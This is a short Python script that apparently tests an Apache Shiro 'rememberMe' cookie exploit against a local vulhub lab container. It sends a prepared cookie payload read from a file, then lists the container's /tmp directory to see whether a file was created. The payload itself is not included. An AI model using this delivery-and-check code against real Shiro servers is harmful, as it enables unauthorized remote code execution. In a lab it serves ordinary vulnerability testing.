import sys, requests
cookie = open("labs/cookie-cc6c.txt").read().strip()
print(f"Cookie length: {len(cookie)} chars")
resp = requests.get("http://127.0.0.1:18080", headers={"Cookie": f"rememberMe={cookie}"}, timeout=30, allow_redirects=False)
print(f"Status: {resp.status_code}")
print(f"Set-Cookie: {resp.headers.get('Set-Cookie', 'N/A')}")
# Check container for any file created
import subprocess
result = subprocess.run(["docker", "exec", "vulhub-shiro-web-1", "ls", "-la", "/tmp/"], capture_output=True, text=True)
print(f"/tmp files: {result.stdout[:500]}")
